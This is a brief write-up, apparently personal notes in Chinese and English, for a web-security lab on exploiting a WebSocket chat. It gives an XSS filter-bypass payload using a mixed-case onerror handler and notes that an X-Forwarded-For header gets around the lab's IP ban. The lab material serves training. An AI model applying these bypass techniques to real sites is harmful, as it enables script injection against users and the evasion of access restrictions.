# Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.

* If you're struggling to bypass the XSS filter, try out our XSS labs.
* Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.

## WebSockets
* 題目說有 XSS filter 跟 ban ip，所以要稍微 bypass 一下，用 `X-Forwarded-For` 就可以 bypass ban ip 的部份
```
payload = </td><img src=# oNeRrOr=alert`1`>
```